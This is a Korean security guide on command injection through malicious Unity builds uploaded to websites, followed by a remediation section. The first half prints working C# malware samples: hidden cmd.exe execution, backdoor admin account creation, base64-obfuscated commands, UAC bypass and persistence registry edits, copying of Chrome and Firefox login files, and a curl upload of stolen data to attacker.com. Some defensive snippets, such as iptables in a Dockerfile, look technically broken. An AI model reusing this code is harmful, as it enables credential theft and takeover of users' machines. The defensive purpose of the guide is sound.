<details>
<summary><h1>Unity Command Injection</h1></summary>

## 목차
1. [정의&원리](#1-정의원리)
2. [조치 가이드](#2-조치-가이드)

---

<details>
<summary><h2>1. 정의&원리</h2></summary>

### 유니티 파일 업로드 시스템 명령어 실행 취약점이란?
웹 사이트에서 유니티 빌드 파일을 업로드하는 기능에서, 악성 스크립트가 포함된 파일에 대한 적절한 검증 없이 업로드를 허용할 때 발생하는 취약점입니다. 사용자가 해당 파일을 실행하면 악성 스크립트를 통해 시스템 명령어가 실행될 수 있습니다.

### 취약점 발생 위치
- **서버 측**: 유니티 빌드 파일 업로드 처리 과정
- **클라이언트 측**: 업로드된 유니티 파일 실행 시점
- **실행 환경**: 사용자 브라우저 또는 유니티 런타임 환경

<details>
<summary><strong>공격 시나리오</strong></summary>

#### 일반적인 공격 과정:
1. **악성 스크립트 작성**: C# 스크립트에 시스템 명령어 실행 코드 삽입
2. **유니티 프로젝트 빌드**: 악성 스크립트가 포함된 유니티 파일 생성
3. **파일 업로드**: 웹사이트에 악성 유니티 파일 업로드
4. **사용자 유인**: 정상적인 게임이나 애플리케이션으로 위장
5. **실행 및 공격**: 사용자가 버튼 클릭 시 시스템 명령어 실행

</details>

<details>
<summary><strong>취약한 코드 패턴</strong></summary>

#### 기본적인 악성 스크립트 구조:
```csharp
using UnityEngine;
using System.Diagnostics;

public class OpenURL : MonoBehaviour 
{
    public void testURL() 
    {
        // 기본 시스템 명령어 실행
        string cmdCommand = "/c start explorer \"C:\\\" & taskmgr & pause";
        Process.Start("cmd.exe", cmdCommand);
    }
}
```

#### 고급 악성 스크립트 패턴:
```csharp
using UnityEngine;
using System.Diagnostics;
using System.Collections;

public class AdvancedMalware : MonoBehaviour
{
    void Start()
    {
        // 지연 실행으로 탐지 회피
        StartCoroutine(DelayedExecution());
    }
    
    IEnumerator DelayedExecution()
    {
        yield return new WaitForSeconds(10f);
        
        // 시스템 정보 수집
        ExecuteCommand("systeminfo > %temp%\\sysinfo.txt");
        
        yield return new WaitForSeconds(2f);
        
        // 네트워크 정보 수집
        ExecuteCommand("ipconfig /all >> %temp%\\sysinfo.txt");
        
        yield return new WaitForSeconds(2f);
        
        // 사용자 계정 생성
        ExecuteCommand("net user hacker password123 /add");
        
        // 관리자 그룹 추가
        ExecuteCommand("net localgroup administrators hacker /add");
    }
    
    void ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c " + command;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            
            Process.Start(startInfo);
        }
        catch (System.Exception e)
        {
            Debug.Log("Command execution failed: " + e.Message);
        }
    }
}
```

#### 암호화된 페이로드 패턴:
```csharp
using UnityEngine;
using System.Diagnostics;
using System;
using System.Text;

public class EncryptedPayload : MonoBehaviour
{
    // Base64로 인코딩된 악성 명령어들
    string[] encodedCommands = {
        "bmV0IHVzZXIgaGFja2VyIHBhc3N3b3JkMTIzIC9hZGQ=", // net user hacker password123 /add
        "cmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9u", // 레지스트리 조작
        "c2NodGFza3MgL2NyZWF0ZSAvdG4gIlN5c3RlbVVwZGF0ZSIgL3RyICJDOlxcdGVtcFxcYmFja2Rvb3IuZXhlIg==" // 스케줄 작업 생성
    };
    
    public void ExecuteHiddenPayload()
    {
        foreach (string encodedCmd in encodedCommands)
        {
            string decodedCommand = DecodeBase64(encodedCmd);
            ExecuteSystemCommand(decodedCommand);
        }
    }
    
    string DecodeBase64(string encodedText)
    {
        byte[] data = Convert.FromBase64String(encodedText);
        return Encoding.UTF8.GetString(data);
    }
    
    void ExecuteSystemCommand(string command)
    {
        Process.Start("cmd.exe", "/c " + command);
    }
}
```

</details>

<details>
<summary><strong>공격 유형별 분류</strong></summary>

#### 1.1. 직접 시스템 명령어 실행
```csharp
// 파일 시스템 조작
Process.Start("cmd.exe", "/c copy %USERPROFILE%\\Documents\\*.* %temp%\\stolen\\");

// 네트워크 스캔
Process.Start("cmd.exe", "/c for /L %i in (1,1,254) do ping -n 1 192.168.1.%i");

// 시스템 정보 수집
Process.Start("cmd.exe", "/c whoami /all > %temp%\\userinfo.txt");
```

#### 1.2. 권한 상승 시도
```csharp
// 관리자 계정 활성화
Process.Start("cmd.exe", "/c net user administrator /active:yes");

// 새로운 관리자 계정 생성
Process.Start("cmd.exe", "/c net user backdoor P@ssw0rd123! /add");
Process.Start("cmd.exe", "/c net localgroup administrators backdoor /add");

// UAC 우회 시도
Process.Start("cmd.exe", "/c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ");
```

#### 1.3. 지속성 확보
```csharp
// 시작 프로그램 등록
Process.Start("cmd.exe", "/c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /d C:\\temp\\malware.exe");

// 스케줄 작업 생성
Process.Start("cmd.exe", "/c schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\temp\\backdoor.exe\" /sc daily /st 09:00");

// 서비스 등록
Process.Start("cmd.exe", "/c sc create BackdoorService binPath=\"C:\\temp\\service.exe\" start=auto");
```

#### 1.4. 데이터 탈취
```csharp
// 브라우저 데이터 수집
Process.Start("cmd.exe", "/c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" %temp%\\chrome_data.db");
Process.Start("cmd.exe", "/c copy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json\" %temp%\\");

// 문서 파일 수집
Process.Start("cmd.exe", "/c forfiles /p %USERPROFILE% /s /m *.pdf /c \"cmd /c copy @path %temp%\\docs\\\"");
Process.Start("cmd.exe", "/c forfiles /p %USERPROFILE% /s /m *.docx /c \"cmd /c copy @path %temp%\\docs\\\"");

// 데이터 외부 전송
Process.Start("cmd.exe", "/c curl -X POST -F \"file=@%temp%\\stolen_data.zip\" http://attacker.com/upload");
```

</details>

<details>
<summary><strong>기술적 동작 원리</strong></summary>

#### Unity WebGL vs Standalone 차이점:
```csharp
#if UNITY_WEBGL
    // WebGL에서는 일반적으로 System.Diagnostics.Process가 제한됨
    // 하지만 특정 조건에서 브라우저 API 활용 가능
    Application.ExternalEval("window.open('file:///C:/', '_blank');");
    
#elif UNITY_STANDALONE
    // Standalone 빌드에서는 직접적인 시스템 접근 가능
    Process.Start("cmd.exe", "/c dir C:\\ > %temp%\\directories.txt");
    
    // PowerShell 실행도 가능
    Process.Start("powershell.exe", "-Command Get-Process | Out-File %temp%\\processes.txt");
    
#endif
```

#### UI 이벤트와 연결:
```csharp
using UnityEngine;
using UnityEngine.UI;
using System.Diagnostics;

public class MaliciousButton : MonoBehaviour
{
    void Start()
    {
        // 버튼 컴포넌트 가져오기
        Button btn = GetComponent<Button>();
        
        // 클릭 이벤트에 악성 함수 연결
        btn.onClick.AddListener(() => {
            ExecuteMaliciousCode();
        });
        
        // 또는 다른 UI 이벤트 활용
        btn.onClick.AddListener(delegate { StartCoroutine(DelayedAttack()); });
    }
    
    void ExecuteMaliciousCode()
    {
        // 사용자가 버튼을 클릭하는 순간 실행
        Process.Start("cmd.exe", "/c taskmgr & explorer C:\\");
    }
    
    System.Collections.IEnumerator DelayedAttack()
    {
        // 5초 후 실행하여 의심을 피함
        yield return new WaitForSeconds(5f);
        
        Process.Start("cmd.exe", "/c net user attacker P@ssw0rd! /add /comment:\"System Account\"");
    }
}
```

</details>

</details>

<details>
<summary><h2>2. 조치 가이드</h2></summary>

### 2.1. 파일 업로드 검증

#### 2.1.1. 기본 파일 검증
```php
// 파일 확장자 및 크기 제한
$allowed_ext = ['unity3d', 'unityweb'];
$max_size = 10 * 1024 * 1024; // 10MB

if (!in_array($ext, $allowed_ext) || $file_size > $max_size) {
    reject_upload();
}
```

#### 2.1.2. 압축 파일 내용 스캔
```python
import zipfile
import re

def scan_unity_file(file_path):
    dangerous_patterns = [
        r'Process\.Start',
        r'System\.Diagnostics',
        r'cmd\.exe',
        r'net\s+user',
        r'reg\s+add'
    ]
    
    with zipfile.ZipFile(file_path, 'r') as zip_file:
        for file_info in zip_file.filelist:
            if file_info.filename.endswith('.cs'):
                content = zip_file.read(file_info).decode('utf-8', errors='ignore')
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return False  # 위험한 패턴 발견
    
    return True  # 안전
```

### 2.2. 실행 환경 보안

#### 2.2.1. 샌드박스 실행 환경 구축
```bash
# Docker를 이용한 격리된 실행 환경
FROM ubuntu:20.04
RUN useradd -m -s /bin/bash unity_user
USER unity_user
WORKDIR /sandbox

# 네트워크 접근 차단
RUN iptables -A OUTPUT -j DROP

# 파일 시스템 접근 제한
RUN mount -o ro /usr/bin
```

#### 2.2.2. 브라우저 보안 정책
```html
<!-- Content Security Policy 적용 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-eval';">

<!-- 권한 정책 제한 -->
<meta http-equiv="Permissions-Policy" 
      content="camera=(), microphone=(), geolocation=()">
```

### 2.3. 관리자 승인 시스템

#### 2.3.1. 수동 검토 프로세스
```sql
-- 승인 대기 테이블 생성
CREATE TABLE file_approvals (
    id INT AUTO_INCREMENT PRIMARY KEY,
    filename VARCHAR(255),
    upload_time DATETIME,
    status ENUM('pending', 'approved', 'rejected'),
    reviewer_id INT
);
```

#### 2.3.2. 48시간 검토 기간 설정
```php
// 업로드 후 48시간 대기 후 공개
$public_time = date('Y-m-d H:i:s', strtotime('+48 hours'));
$stmt = $pdo->prepare("UPDATE files SET public_time = ? WHERE id = ?");
$stmt->execute([$public_time, $file_id]);
```

### 2.4. 모니터링 시스템

#### 2.4.1. 실시간 로그 모니터링
```bash
# 시스템 명령어 실행 감지
tail -f /var/log/syslog | grep -E "(cmd.exe|powershell|net user)" | \
while read line; do
    echo "ALERT: Suspicious command detected - $line"
    # 관리자에게 알림 전송
done
```

#### 2.4.2. 파일 실행 추적
```javascript
// Unity WebGL 실행 시 모니터링
window.addEventListener('beforeunload', function(e) {
    // 비정상 종료 시 서버에 보고
    navigator.sendBeacon('/security-alert', {
        type: 'abnormal_exit',
        timestamp: new Date().toISOString()
    });
});
```

### 2.5. 응급 대응 절차

#### 2.5.1. 악성 파일 발견 시 조치
```bash
# 1. 즉시 파일 격리
mv /var/www/uploads/malicious_file.unity3d /quarantine/

# 2. 접근 로그 확인
grep "malicious_file" /var/log/apache2/access.log

# 3. 영향받은 사용자 파악
mysql -e "SELECT user_id, access_time FROM access_logs WHERE file_name LIKE '%malicious_file%'"
```

#### 2.5.2. 사용자 알림 및 조치
```php
// 긴급 보안 알림 발송
function send_security_alert($affected_users) {
    foreach ($affected_users as $user) {
        mail($user['email'], 
             '보안 알림', 
             '최근 실행하신 파일에서 보안 위험이 발견되어 제거했습니다. PC 검사를 권장합니다.');
    }
}
```

</details>

</details>
